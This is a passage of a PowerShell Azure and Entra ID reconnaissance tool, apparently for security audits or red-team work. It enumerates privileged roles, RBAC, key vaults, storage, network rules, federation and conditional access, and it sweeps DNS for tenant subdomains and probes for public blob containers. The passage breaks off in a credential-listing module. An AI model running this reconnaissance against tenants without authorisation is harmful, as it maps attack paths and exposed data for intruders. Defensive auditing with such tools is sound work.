function Enumerate-PrivilegedIdentity {
    Write-Host "`n[*] Enumerating Privileged Identity (directory roles, PIM, admin units)..." -ForegroundColor Yellow

    # Cache role definitions for name lookups
    $roleDefs = @{}
    try {
        $defs = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions?`$top=999"
        foreach ($d in $defs) { $roleDefs[$d.id] = $d.displayName }
        Write-Host "    Role definitions: $($defs.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] roleDefinitions failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # Active assignments
    try {
        $assigns = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$top=999"
        foreach ($ra in $assigns) {
            $principalInfo = $null
            try {
                $principalInfo = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/directoryObjects/$($ra.principalId)" -Headers (Get-GraphToken) -ErrorAction Stop
            } catch { }

            $null = $Report.DirectoryRoleAssignments.Add([PSCustomObject]@{
                RoleDefinitionId = $ra.roleDefinitionId
                RoleName         = $roleDefs[$ra.roleDefinitionId]
                PrincipalId      = $ra.principalId
                PrincipalType    = $principalInfo.'@odata.type'
                PrincipalName    = if ($principalInfo.displayName) { $principalInfo.displayName } else { '(unknown)' }
                PrincipalUPN     = $principalInfo.userPrincipalName
                DirectoryScopeId = $ra.directoryScopeId
            })

            # Flag privileged SPNs separately — SolarWinds-style
            if ($principalInfo.'@odata.type' -eq '#microsoft.graph.servicePrincipal') {
                $null = $Report.PrivilegedServicePrincipals.Add([PSCustomObject]@{
                    RoleName         = $roleDefs[$ra.roleDefinitionId]
                    SpnDisplayName   = $principalInfo.displayName
                    SpnId            = $ra.principalId
                    DirectoryScopeId = $ra.directoryScopeId
                })
            }
        }
        Write-Host "    Directory role assignments: $($assigns.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] roleAssignments failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # PIM eligible
    try {
        $pim = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?`$top=999"
        foreach ($p in $pim) {
            $principalInfo = $null
            try {
                $principalInfo = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/directoryObjects/$($p.principalId)" -Headers (Get-GraphToken) -ErrorAction Stop
            } catch { }
            $null = $Report.PIMEligibleRoles.Add([PSCustomObject]@{
                RoleName         = $roleDefs[$p.roleDefinitionId]
                PrincipalName    = $principalInfo.displayName
                PrincipalUPN     = $principalInfo.userPrincipalName
                PrincipalType    = $principalInfo.'@odata.type'
                DirectoryScopeId = $p.directoryScopeId
                StartDateTime    = $p.scheduleInfo.startDateTime
                ExpirationType   = $p.scheduleInfo.expiration.type
                MemberType       = $p.memberType
                Status           = $p.status
            })
        }
        Write-Host "    PIM eligible assignments: $($pim.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] PIM eligibility endpoint not available (license/permission): $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # Administrative Units
    try {
        $aus = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits?`$top=999"
        foreach ($a in $aus) {
            $null = $Report.AdministrativeUnits.Add([PSCustomObject]@{
                Id          = $a.id
                DisplayName = $a.displayName
                Description = $a.description
                Visibility  = $a.visibility
            })
        }
        Write-Host "    Administrative Units: $($aus.Count)" -ForegroundColor Cyan
    } catch { }

    # Role-assignable ("privileged") groups
    try {
        $pg = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/groups?`$filter=isAssignableToRole eq true&`$top=999&`$select=id,displayName,description,createdDateTime,securityEnabled,mailEnabled"
        foreach ($g in $pg) {
            # owners
            $owners = @()
            try {
                $ownersList = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/groups/$($g.id)/owners?`$select=displayName,userPrincipalName"
                $owners = $ownersList | ForEach-Object { if ($_.userPrincipalName) { $_.userPrincipalName } else { $_.displayName } }
            } catch { }

            $null = $Report.PrivilegedGroups.Add([PSCustomObject]@{
                Id              = $g.id
                DisplayName     = $g.displayName
                Description     = $g.description
                CreatedDateTime = $g.createdDateTime
                SecurityEnabled = $g.securityEnabled
                Owners          = ($owners -join '; ')
            })
        }
        Write-Host "    Role-assignable groups: $($pg.Count)" -ForegroundColor Cyan
    } catch { }
}

# -----------------------------------------------------------------------------
function Enumerate-AzureRbac {
    Write-Host "`n[*] Enumerating Azure RBAC (role assignments, custom roles, classic admins)..." -ForegroundColor Yellow
    $subs = Get-AllSubscriptions
    foreach ($sub in $subs) {
        Set-AzContext -SubscriptionId $sub.Id | Out-Null
        try {
            $ras = Get-AzRoleAssignment -ErrorAction SilentlyContinue
            foreach ($ra in $ras) {
                $null = $Report.RbacAssignments.Add([PSCustomObject]@{
                    SubscriptionName  = $sub.Name
                    SubscriptionId    = $sub.Id
                    RoleDefinitionName= $ra.RoleDefinitionName
                    PrincipalName     = $ra.DisplayName
                    PrincipalType     = $ra.ObjectType
                    PrincipalId       = $ra.ObjectId
                    SignInName        = $ra.SignInName
                    Scope             = $ra.Scope
                    IsCustom          = ($ra.RoleDefinitionName -notmatch '^(Owner|Contributor|Reader|User Access Administrator)$')
                })
            }
            Write-Host "    [$($sub.Name)] RBAC assignments: $($ras.Count)" -ForegroundColor Cyan
        } catch {
            Write-Host "    [!] [$($sub.Name)] RBAC enum failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }

        # Custom role definitions (per subscription)
        try {
            $customs = Get-AzRoleDefinition -Custom -ErrorAction SilentlyContinue
            foreach ($cr in $customs) {
                $null = $Report.CustomRoles.Add([PSCustomObject]@{
                    SubscriptionName  = $sub.Name
                    SubscriptionId    = $sub.Id
                    Name              = $cr.Name
                    Description       = $cr.Description
                    IsCustom          = $cr.IsCustom
                    Actions           = ($cr.Actions -join '; ')
                    NotActions        = ($cr.NotActions -join '; ')
                    DataActions       = ($cr.DataActions -join '; ')
                    NotDataActions    = ($cr.NotDataActions -join '; ')
                    AssignableScopes  = ($cr.AssignableScopes -join '; ')
                })
            }
        } catch { }

        # Classic administrators
        try {
            $uri = "https://management.azure.com/subscriptions/$($sub.Id)/providers/Microsoft.Authorization/classicAdministrators?api-version=2015-07-01"
            $ca = Invoke-ArmPaged -Uri $uri
            foreach ($c in $ca) {
                $null = $Report.ClassicAdmins.Add([PSCustomObject]@{
                    SubscriptionName = $sub.Name
                    SubscriptionId   = $sub.Id
                    EmailAddress     = $c.properties.emailAddress
                    Role             = $c.properties.role
                })
            }
        } catch { }
    }
}

# -----------------------------------------------------------------------------
function Enumerate-JuicyResources {
    Write-Host "`n[*] Enumerating Juicy Resources (Storage, KV, Automation, App Svc, Mgd IDs, ACR)..." -ForegroundColor Yellow
    $subs = Get-AllSubscriptions
    foreach ($sub in $subs) {
        Set-AzContext -SubscriptionId $sub.Id | Out-Null
        $subBase = "https://management.azure.com/subscriptions/$($sub.Id)"

        # Storage Accounts — expand to see public access + ACLs
        try {
            $sa = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01"
            foreach ($s in $sa) {
                $null = $Report.StorageAccounts.Add([PSCustomObject]@{
                    SubscriptionName        = $sub.Name
                    Name                    = $s.name
                    Location                = $s.location
                    Kind                    = $s.kind
                    Sku                     = $s.sku.name
                    AllowBlobPublicAccess   = $s.properties.allowBlobPublicAccess
                    AllowSharedKeyAccess    = $s.properties.allowSharedKeyAccess
                    MinimumTlsVersion       = $s.properties.minimumTlsVersion
                    SupportsHttpsTrafficOnly= $s.properties.supportsHttpsTrafficOnly
                    PublicNetworkAccess     = $s.properties.publicNetworkAccess
                    DefaultNetworkAction    = $s.properties.networkAcls.defaultAction
                    IpRules                 = ($s.properties.networkAcls.ipRules | ForEach-Object { $_.value }) -join '; '
                    ResourceId              = $s.id
                })
            }
        } catch { }

        # Key Vaults — access model, soft-delete status, network config
        try {
            $kv = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01"
            foreach ($v in $kv) {
                $null = $Report.KeyVaults.Add([PSCustomObject]@{
                    SubscriptionName        = $sub.Name
                    Name                    = $v.name
                    Location                = $v.location
                    VaultUri                = $v.properties.vaultUri
                    EnableRbacAuthorization = $v.properties.enableRbacAuthorization
                    EnableSoftDelete        = $v.properties.enableSoftDelete
                    EnablePurgeProtection   = $v.properties.enablePurgeProtection
                    PublicNetworkAccess     = $v.properties.publicNetworkAccess
                    AccessPolicyCount       = (@($v.properties.accessPolicies)).Count
                    ResourceId              = $v.id
                })
            }
        } catch { }

        # Automation Accounts
        try {
            $aa = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.Automation/automationAccounts?api-version=2022-08-08"
            foreach ($a in $aa) {
                $null = $Report.AutomationAccounts.Add([PSCustomObject]@{
                    SubscriptionName   = $sub.Name
                    Name               = $a.name
                    Location           = $a.location
                    PublicNetworkAccess= $a.properties.publicNetworkAccess
                    State              = $a.properties.state
                    Sku                = $a.properties.sku.name
                    ResourceId         = $a.id
                })
            }
        } catch { }

        # App Services (Web/Function/Logic)
        try {
            $sites = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.Web/sites?api-version=2023-01-01"
            foreach ($w in $sites) {
                $null = $Report.AppServices.Add([PSCustomObject]@{
                    SubscriptionName       = $sub.Name
                    Name                   = $w.name
                    Kind                   = $w.kind
                    Location               = $w.location
                    State                  = $w.properties.state
                    DefaultHostName        = $w.properties.defaultHostName
                    HttpsOnly              = $w.properties.httpsOnly
                    PublicNetworkAccess    = $w.properties.publicNetworkAccess
                    ClientAffinityEnabled  = $w.properties.clientAffinityEnabled
                    SystemAssignedIdentity = if ($w.identity.type -match 'SystemAssigned') { $w.identity.principalId } else { '' }
                    UserAssignedIdentities = if ($w.identity.userAssignedIdentities) { ($w.identity.userAssignedIdentities.PSObject.Properties.Name) -join '; ' } else { '' }
                    ResourceId             = $w.id
                })
            }
        } catch { }

        # User-Assigned Managed Identities
        try {
            $uais = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31"
            foreach ($mi in $uais) {
                $null = $Report.ManagedIdentities.Add([PSCustomObject]@{
                    SubscriptionName = $sub.Name
                    Name             = $mi.name
                    Location         = $mi.location
                    PrincipalId      = $mi.properties.principalId
                    ClientId         = $mi.properties.clientId
                    TenantId         = $mi.properties.tenantId
                    ResourceId       = $mi.id
                })
            }
        } catch { }

        # Container Registries
        try {
            $acrs = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.ContainerRegistry/registries?api-version=2023-07-01"
            foreach ($r in $acrs) {
                $null = $Report.ContainerRegistries.Add([PSCustomObject]@{
                    SubscriptionName    = $sub.Name
                    Name                = $r.name
                    Location            = $r.location
                    Sku                 = $r.sku.name
                    LoginServer         = $r.properties.loginServer
                    AdminUserEnabled    = $r.properties.adminUserEnabled
                    PublicNetworkAccess = $r.properties.publicNetworkAccess
                    AnonymousPullEnabled= $r.properties.anonymousPullEnabled
                    ResourceId          = $r.id
                })
            }
        } catch { }
    }
    Write-Host "    Storage: $($Report.StorageAccounts.Count), KV: $($Report.KeyVaults.Count), Automation: $($Report.AutomationAccounts.Count), AppSvc: $($Report.AppServices.Count), MI: $($Report.ManagedIdentities.Count), ACR: $($Report.ContainerRegistries.Count)" -ForegroundColor Cyan
}

# -----------------------------------------------------------------------------
function Enumerate-NetworkExposure {
    Write-Host "`n[*] Enumerating Network Exposure (NSGs, Public IPs)..." -ForegroundColor Yellow
    $subs = Get-AllSubscriptions
    foreach ($sub in $subs) {
        Set-AzContext -SubscriptionId $sub.Id | Out-Null
        $subBase = "https://management.azure.com/subscriptions/$($sub.Id)"

        # NSGs
        try {
            $nsgs = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.Network/networkSecurityGroups?api-version=2023-09-01"
            foreach ($n in $nsgs) {
                $null = $Report.NSGs.Add([PSCustomObject]@{
                    SubscriptionName = $sub.Name
                    Name             = $n.name
                    Location         = $n.location
                    ResourceGroup    = ($n.id -split '/')[4]
                    SubnetCount      = (@($n.properties.subnets)).Count
                    NICCount         = (@($n.properties.networkInterfaces)).Count
                    RuleCount        = (@($n.properties.securityRules)).Count
                    ResourceId       = $n.id
                })
                foreach ($r in $n.properties.securityRules) {
                    $srcPfx = if ($r.properties.sourceAddressPrefix) { $r.properties.sourceAddressPrefix } else { ($r.properties.sourceAddressPrefixes -join ', ') }
                    $dstPort = if ($r.properties.destinationPortRange) { $r.properties.destinationPortRange } else { ($r.properties.destinationPortRanges -join ', ') }
                    $internetExposed = ($r.properties.access -eq 'Allow' -and $r.properties.direction -eq 'Inbound' -and ($srcPfx -match '^(\*|0\.0\.0\.0/0|Internet|Any)$'))
                    $risky = $false
                    if ($internetExposed -and $dstPort -match '22|3389|1433|3306|5432|27017|5985|5986|445|135|139') { $risky = $true }

                    $null = $Report.NSGRules.Add([PSCustomObject]@{
                        SubscriptionName = $sub.Name
                        NSG              = $n.name
                        RuleName         = $r.name
                        Priority         = $r.properties.priority
                        Direction        = $r.properties.direction
                        Access           = $r.properties.access
                        Protocol         = $r.properties.protocol
                        Source           = $srcPfx
                        DestinationPort  = $dstPort
                        InternetExposed  = $internetExposed
                        RiskyService     = $risky
                    })
                }
            }
            Write-Host "    [$($sub.Name)] NSGs: $($nsgs.Count)" -ForegroundColor Cyan
        } catch { }

        # Public IPs
        try {
            $pips = Invoke-ArmPaged -Uri "$subBase/providers/Microsoft.Network/publicIPAddresses?api-version=2023-09-01"
            foreach ($p in $pips) {
                $null = $Report.PublicIPs.Add([PSCustomObject]@{
                    SubscriptionName = $sub.Name
                    Name             = $p.name
                    Location         = $p.location
                    IpAddress        = $p.properties.ipAddress
                    AllocationMethod = $p.properties.publicIPAllocationMethod
                    AddressVersion   = $p.properties.publicIPAddressVersion
                    AttachedToId     = $p.properties.ipConfiguration.id
                    Fqdn             = $p.properties.dnsSettings.fqdn
                    ResourceId       = $p.id
                })
            }
        } catch { }
    }
    Write-Host "    Risky NSG rules (inbound Allow from internet on common services): $(($Report.NSGRules | Where-Object { $_.RiskyService }).Count)" -ForegroundColor Cyan
}

# -----------------------------------------------------------------------------
function Enumerate-Federation {
    Write-Host "`n[*] Enumerating Federation / Cross-Tenant Access..." -ForegroundColor Yellow

    # Domain federation — federation manipulation is a Shadow Credentials / Golden SAML vector
    try {
        $domains = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/domains?`$top=999"
        foreach ($d in $domains) {
            $fed = $null
            try {
                $fed = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/domains/$($d.id)/federationConfiguration" -Headers (Get-GraphToken) -ErrorAction Stop
            } catch { }
            $null = $Report.FederationSettings.Add([PSCustomObject]@{
                DomainId                 = $d.id
                AuthenticationType       = $d.authenticationType
                IsDefault                = $d.isDefault
                IsInitial                = $d.isInitial
                IsRoot                   = $d.isRoot
                IsVerified               = $d.isVerified
                SupportedServices        = ($d.supportedServices -join ', ')
                FederatedIssuerUri       = if ($fed.value) { ($fed.value | ForEach-Object { $_.issuerUri }) -join '; ' } else { '' }
                FederatedActiveSignInUri = if ($fed.value) { ($fed.value | ForEach-Object { $_.activeSignInUri }) -join '; ' } else { '' }
            })
        }
        Write-Host "    Domains: $($domains.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] Domains enum failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # Cross-tenant access
    try {
        $default = $null
        try { $default = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/default" -Headers (Get-GraphToken) -ErrorAction Stop } catch { }
        $partners = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners"

        if ($default) {
            $null = $Report.CrossTenantAccess.Add([PSCustomObject]@{
                ScopeType        = 'Default'
                TenantId         = 'default'
                InboundB2B       = $default.b2bCollaborationInbound.usersAndGroups.accessType
                OutboundB2B      = $default.b2bCollaborationOutbound.usersAndGroups.accessType
                InboundB2BDirect = $default.b2bDirectConnectInbound.usersAndGroups.accessType
                OutboundB2BDirect= $default.b2bDirectConnectOutbound.usersAndGroups.accessType
                InboundTrust_MFA = $default.inboundTrust.isMfaAccepted
                InboundTrust_Compliant = $default.inboundTrust.isCompliantDeviceAccepted
                InboundTrust_HybridJoined = $default.inboundTrust.isHybridAzureADJoinedDeviceAccepted
            })
        }
        foreach ($p in $partners) {
            $null = $Report.CrossTenantAccess.Add([PSCustomObject]@{
                ScopeType        = 'Partner'
                TenantId         = $p.tenantId
                InboundB2B       = $p.b2bCollaborationInbound.usersAndGroups.accessType
                OutboundB2B      = $p.b2bCollaborationOutbound.usersAndGroups.accessType
                InboundB2BDirect = $p.b2bDirectConnectInbound.usersAndGroups.accessType
                OutboundB2BDirect= $p.b2bDirectConnectOutbound.usersAndGroups.accessType
                InboundTrust_MFA = $p.inboundTrust.isMfaAccepted
                InboundTrust_Compliant = $p.inboundTrust.isCompliantDeviceAccepted
                InboundTrust_HybridJoined = $p.inboundTrust.isHybridAzureADJoinedDeviceAccepted
            })
        }
        Write-Host "    Cross-tenant partner configs: $($partners.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] Cross-tenant access enum failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# -----------------------------------------------------------------------------
function Enumerate-ConditionalAccess {
    Write-Host "`n[*] Enumerating Conditional Access, Named Locations, Security Defaults, Auth Methods..." -ForegroundColor Yellow

    # Conditional Access Policies
    try {
        $cas = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"
        foreach ($p in $cas) {
            $null = $Report.ConditionalAccessPolicies.Add([PSCustomObject]@{
                DisplayName       = $p.displayName
                State             = $p.state
                Id                = $p.id
                IncludeUsers      = ($p.conditions.users.includeUsers -join '; ')
                ExcludeUsers      = ($p.conditions.users.excludeUsers -join '; ')
                IncludeGroups     = ($p.conditions.users.includeGroups -join '; ')
                ExcludeGroups     = ($p.conditions.users.excludeGroups -join '; ')
                IncludeRoles      = ($p.conditions.users.includeRoles -join '; ')
                ExcludeRoles      = ($p.conditions.users.excludeRoles -join '; ')
                IncludeApps       = ($p.conditions.applications.includeApplications -join '; ')
                ExcludeApps       = ($p.conditions.applications.excludeApplications -join '; ')
                IncludeLocations  = ($p.conditions.locations.includeLocations -join '; ')
                ExcludeLocations  = ($p.conditions.locations.excludeLocations -join '; ')
                IncludePlatforms  = ($p.conditions.platforms.includePlatforms -join '; ')
                ClientAppTypes    = ($p.conditions.clientAppTypes -join '; ')
                GrantControls     = ($p.grantControls.builtInControls -join '; ')
                Operator          = $p.grantControls.operator
                SessionControls   = ($p.sessionControls.PSObject.Properties.Name -join '; ')
                CreatedDateTime   = $p.createdDateTime
                ModifiedDateTime  = $p.modifiedDateTime
            })
        }
        Write-Host "    Conditional Access policies: $($cas.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] CA policies failed (needs Policy.Read.All): $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # Named Locations
    try {
        $locs = Invoke-GraphPaged -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"
        foreach ($l in $locs) {
            $details = if ($l.ipRanges) { ($l.ipRanges | ForEach-Object { $_.cidrAddress }) -join '; ' }
                       elseif ($l.countriesAndRegions) { ($l.countriesAndRegions -join ', ') }
                       else { '' }
            $null = $Report.NamedLocations.Add([PSCustomObject]@{
                DisplayName             = $l.displayName
                Id                      = $l.id
                OdataType               = $l.'@odata.type'
                IsTrusted               = $l.isTrusted
                Details                 = $details
                IncludeUnknownCountries = $l.includeUnknownCountriesAndRegions
                CreatedDateTime         = $l.createdDateTime
            })
        }
    } catch { }

    # Security Defaults
    try {
        $sd = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy" -Headers (Get-GraphToken) -ErrorAction Stop
        $null = $Report.SecurityDefaults.Add([PSCustomObject]@{
            DisplayName = $sd.displayName
            IsEnabled   = $sd.isEnabled
            Description = $sd.description
        })
    } catch { }

    # Authentication Methods Policy (which MFA methods are allowed)
    try {
        $amp = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy" -Headers (Get-GraphToken) -ErrorAction Stop
        foreach ($m in $amp.authenticationMethodConfigurations) {
            $null = $Report.AuthMethodsPolicies.Add([PSCustomObject]@{
                Method     = $m.id
                State      = $m.state
                ExcludeTargets = ($m.excludeTargets | ForEach-Object { "$($_.targetType):$($_.id)" }) -join '; '
                IncludeTargets = ($m.includeTargets | ForEach-Object { "$($_.targetType):$($_.id)" }) -join '; '
            })
        }
    } catch { }
}

# =============================================================================
# MicroBurst-inspired modules (X, C, H, L)
# =============================================================================

# -----------------------------------------------------------------------------
# Enumerate-ExternalAttackSurface  (menu option X)
#
# Unauthenticated / low-privilege external recon. Uses DNS resolution only -
# no Azure API auth required for the subdomain sweep, though we seed candidate
# names from whatever is already in the authenticated-enum results to keep the
# wordlist focused on THIS tenant rather than spraying the internet.
#
# Covered Azure service suffixes (representative, not exhaustive):
#   *.azurewebsites.net           App Service
#   *.scm.azurewebsites.net       Kudu / App Service deployment endpoints
#   *.cloudapp.net                Classic VMs / load balancers
#   *.cloudapp.azure.com          ARM VMs
#   *.database.windows.net        Azure SQL
#   *.documents.azure.com         Cosmos DB
#   *.vault.azure.net             Key Vault
#   *.blob|file|queue|table.core.windows.net   Storage
#   *.azurecr.io                  Container Registry
#   *.azureedge.net               CDN
#   *.trafficmanager.net          Traffic Manager
#   *.azure-api.net               API Management
#   *.search.windows.net          Azure Cognitive Search
#   *.servicebus.windows.net      Service Bus / Event Hub
#   *.redis.cache.windows.net     Azure Redis
#   *.batch.azure.com             Azure Batch
#   *.azurehdinsight.net          HDInsight
#   *.azuredatalakestore.net      Data Lake Gen1
#
# Also performs unauthenticated public blob container discovery on any storage
# accounts we already know about.
# -----------------------------------------------------------------------------
function Enumerate-ExternalAttackSurface {
    Write-Host "`n[*] (X) Enumerating external attack surface (MicroBurst-style DNS sweep)..." -ForegroundColor Yellow
    Write-Host "    This is an UNAUTHENTICATED sweep - no Azure API calls, just DNS." -ForegroundColor DarkGray

    # Azure service suffix catalog: suffix -> service label
    $azureSuffixes = [ordered]@{
        'azurewebsites.net'           = 'AppService'
        'scm.azurewebsites.net'       = 'AppService-Kudu'
        'cloudapp.net'                = 'ClassicCloudService'
        'cloudapp.azure.com'          = 'ARM-VM'
        'database.windows.net'        = 'AzureSQL'
        'documents.azure.com'         = 'CosmosDB'
        'vault.azure.net'             = 'KeyVault'
        'blob.core.windows.net'       = 'Storage-Blob'
        'file.core.windows.net'       = 'Storage-File'
        'queue.core.windows.net'      = 'Storage-Queue'
        'table.core.windows.net'      = 'Storage-Table'
        'dfs.core.windows.net'        = 'Storage-DataLakeGen2'
        'azurecr.io'                  = 'ContainerRegistry'
        'azureedge.net'               = 'CDN'
        'trafficmanager.net'          = 'TrafficManager'
        'azure-api.net'               = 'APIManagement'
        'search.windows.net'          = 'CognitiveSearch'
        'servicebus.windows.net'      = 'ServiceBus'
        'redis.cache.windows.net'     = 'AzureRedis'
        'batch.azure.com'             = 'AzureBatch'
        'azurehdinsight.net'          = 'HDInsight'
        'azuredatalakestore.net'      = 'DataLakeGen1'
    }

    # Build candidate name list from anything we already know about the tenant.
    $seeds = New-Object System.Collections.Generic.HashSet[string]

    # 1) Domain prefix / tenant label from TenantId
    if ($TenantId -match '^[^.]+') {
        $null = $seeds.Add(($matches[0]).ToLower())
    }
    # 2) Everything enumerated so far: resource names, storage account names, app reg display names
    foreach ($r in $Report.Resources)           { if ($r.Name)         { $null = $seeds.Add(([string]$r.Name).ToLower()) } }
    foreach ($rg in $Report.ResourceGroups)     { if ($rg.Name)        { $null = $seeds.Add(([string]$rg.Name).ToLower()) } }
    foreach ($s in $Report.StorageAccounts)     { if ($s.Name)         { $null = $seeds.Add(([string]$s.Name).ToLower()) } }
    foreach ($kv in $Report.KeyVaults)          { if ($kv.Name)        { $null = $seeds.Add(([string]$kv.Name).ToLower()) } }
    foreach ($ap in $Report.AppServices)        { if ($ap.Name)        { $null = $seeds.Add(([string]$ap.Name).ToLower()) } }
    foreach ($acr in $Report.ContainerRegistries){ if ($acr.Name)      { $null = $seeds.Add(([string]$acr.Name).ToLower()) } }
    foreach ($ar in $Report.AppRegistrations)   { if ($ar.DisplayName) { $null = $seeds.Add(([string]$ar.DisplayName -replace '[^a-z0-9]','').ToLower()) } }

    # 3) Verified Entra domains (tenant label permutations)
    try {
        $dom = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/domains" -Headers (Get-GraphToken) -ErrorAction Stop
        foreach ($d in $dom.value) {
            if ($d.id) {
                $label = ($d.id -split '\.')[0]
                if ($label) { $null = $seeds.Add($label.ToLower()) }
            }
        }
    } catch { }

    # 4) Permutation suffixes/prefixes - classic attacker wordlist
    $permutations = @('','-dev','-test','-prod','-staging','-int','-uat','-api','-web','-app','-data','-backup','-qa','-demo','-admin','dev','prod','test','stage','api','01','02')

    $candidates = New-Object System.Collections.Generic.HashSet[string]
    foreach ($seed in $seeds) {
        # Strip non-DNS chars
        $clean = ($seed -replace '[^a-z0-9\-]','')
        if (-not $clean -or $clean.Length -lt 2) { continue }
        foreach ($p in $permutations) {
            $null = $candidates.Add(($clean + $p))
            if ($p.StartsWith('-')) { $null = $candidates.Add(($p.TrimStart('-') + '-' + $clean)) }
        }
    }

    Write-Host ("    [+] {0} seed candidates, resolving across {1} Azure service suffixes..." -f $candidates.Count, $azureSuffixes.Count) -ForegroundColor Cyan

    $resolvedCount = 0
    $perService    = @{}
    $blobAccounts  = New-Object System.Collections.Generic.HashSet[string]

    foreach ($cand in $candidates) {
        foreach ($suffix in $azureSuffixes.Keys) {
            $fqdn    = "$cand.$suffix"
            $service = $azureSuffixes[$suffix]
            $resolved = $null
            try {
                $resolved = Resolve-DnsName -Name $fqdn -Type A -ErrorAction Stop -QuickTimeout -DnsOnly |
                            Where-Object { $_.IPAddress -or $_.NameHost } |
                            Select-Object -First 1
            } catch { $resolved = $null }

            if ($resolved) {
                $ip = if ($resolved.IPAddress) { $resolved.IPAddress } else { $resolved.NameHost }
                $null = $Report.ExternalSubdomains.Add([PSCustomObject]@{
                    Service      = $service
                    FQDN         = $fqdn
                    IPOrCname    = $ip
                    SeedFrom     = $cand
                    SuffixMatched= $suffix
                })
                $resolvedCount++
                if (-not $perService.ContainsKey($service)) { $perService[$service] = 0 }
                $perService[$service]++
                if ($service -like 'Storage-*') {
                    $null = $blobAccounts.Add($cand)
                }
            }
        }
    }

    Write-Host ("    [+] Resolved {0} external FQDNs." -f $resolvedCount) -ForegroundColor Green

    # Also try blob containers on every known storage account name (authenticated-enum + resolved)
    foreach ($s in $Report.StorageAccounts) { if ($s.Name) { $null = $blobAccounts.Add(([string]$s.Name).ToLower()) } }

    Write-Host ("    [*] Probing {0} storage accounts for PUBLIC blob containers..." -f $blobAccounts.Count) -ForegroundColor Cyan
    $commonContainers = @('backup','backups','data','logs','logs-archive','public','images','media','files','uploads','downloads','assets','static','web','www','reports','export','exports','archive','dump','db','database','sql','iis','source','repo')

    foreach ($acct in $blobAccounts) {
        foreach ($ctr in $commonContainers) {
            $url = "https://$acct.blob.core.windows.net/$ctr" + '?restype=container&comp=list&maxresults=5'
            try {
                $resp = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
                if ($resp.StatusCode -eq 200) {
                    # Parse blob names (first 5) out of the XML for flavor
                    $blobNames = @()
                    try {
                        $xml = [xml]$resp.Content
                        $blobNames = $xml.EnumerationResults.Blobs.Blob | Select-Object -First 5 | ForEach-Object { $_.Name }
                    } catch { $blobNames = @() }
                    $null = $Report.ExternalBlobs.Add([PSCustomObject]@{
                        StorageAccount = $acct
                        Container      = $ctr
                        Url            = "https://$acct.blob.core.windows.net/$ctr"
                        PublicAccess   = 'Container'
                        SampleBlobs    = ($blobNames -join '; ')
                    })
                }
            } catch {
                # 404 = container not public / not exist; we only care about 200 successes
            }
        }
    }

    Write-Host ("    [+] Found {0} public blob containers." -f $Report.ExternalBlobs.Count) -ForegroundColor Green

    # Summary per service
    foreach ($svc in $perService.Keys) {
        $null = $Report.ExternalAttackSurfaceSummary.Add([PSCustomObject]@{
            Service    = $svc
            HitCount   = $perService[$svc]
            Category   = 'DNS-Resolved'
        })
    }
    $null = $Report.ExternalAttackSurfaceSummary.Add([PSCustomObject]@{
        Service    = 'PublicBlobContainers'
        HitCount   = $Report.ExternalBlobs.Count
        Category   = 'PublicExposure'
    })
}

# -----------------------------------------------------------------------------
# Enumerate-CredentialExposure  (menu option C)
#
# Read-only credential-storage audit. NAMES ONLY - we never retrieve values.
# Data-plane listings (KV secret/key/cert names) DO generate KeyVault diagnostic
# events; they're the cheapest cost in exchange for concrete credential-storage
# visibility.
#
# Surfaces:
#   - Automation Account credential assets (ARM control-plane listing)
#   - Key Vault secret / key / certificate NAMES (data-plane, names only)
#   - AKS clusters where listClusterAdminCredential is callable
#   - App Services with basic publishing credentials enabled
# -----------------------------------------------------------------------------
function Enumerate-CredentialExposure {
    Write-Host "`n[*] (C) Enumerating credential storage (names only, NO values)..." -ForegroundColor Yellow
    Write-Host "    Note: Key Vault secret/key name listings DO generate KV diagnostic events." -ForegroundColor DarkGray

    $subs = Get-AllSubscriptions
    if (-not $subs) { Write-Host "    [!] No subscriptions." -ForegroundColor Red ; return }

    $armHdr = Get-ArmToken

    foreach ($sub in $subs) {
